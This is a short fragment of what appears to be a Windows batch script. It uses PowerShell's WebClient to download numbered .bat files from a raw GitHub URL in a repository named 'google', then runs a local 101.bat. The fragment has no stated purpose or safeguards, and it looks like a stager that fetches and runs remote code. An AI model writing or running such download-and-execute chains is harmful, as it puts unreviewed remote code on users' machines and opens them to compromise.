...
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Cisfran05/google/main/104.bat', '.\104.bat') }
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Cisfran05/google/main/105.bat', '.\105.bat') }
call .\101.bat
